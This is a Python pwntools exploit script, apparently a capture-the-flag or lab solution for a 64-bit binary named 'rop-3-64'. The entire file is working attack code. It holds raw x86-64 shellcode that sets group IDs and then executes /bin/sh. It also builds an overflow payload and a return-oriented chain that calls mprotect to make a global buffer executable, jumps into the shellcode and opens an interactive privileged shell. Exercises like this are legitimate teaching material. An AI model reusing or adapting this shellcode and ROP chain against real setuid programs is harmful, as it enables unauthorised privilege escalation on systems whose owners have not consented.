from pwn import *

SHELLCODE = 'H\xc7\xc0l\x00\x00\x00\x0f\x05H\x89\xc7H\x89\xc6H\xc7\xc0r\x00\x00\x00\x0f\x05H\xbb//bin/shj\x00SH\x89\xe7H\xc7\xc6\x00\x00\x00\x00H\xc7\xc2\x00\x00\x00\x00H\xc7\xc0;\x00\x00\x00\x0f\x05'

GARB = 'bbbbbbbb'

# Addresses needed for the attack
pop_rdi_ret_addr = 0x400743
pop_rsi_pop_r15_ret_addr = 0x400741
pop_rdx_pop_rbp_ret_addr = 0x40064a
mprotect_addr = ELF('./rop-3-64').symbols['mprotect']
gbuf_addr = 0x601080 # Address of g_buf in the program code
gbuf_alligned_addr = 0x601000 # Address of g_buf page aligned

inp = SHELLCODE + ('a' * (0x80- len(SHELLCODE))) + GARB + p64(pop_rdi_ret_addr) + p64(gbuf_alligned_addr) + p64(pop_rsi_pop_r15_ret_addr) + p64(0x1000) + GARB + p64(pop_rdx_pop_rbp_ret_addr) + p64(7) + GARB + p64(mprotect_addr) + p64(gbuf_addr)

# Launch processs and send rop chain
p = process('./rop-3-64')

# send attack
p.send(inp)

# Use privilleged shell to get the flag
p.interactive()
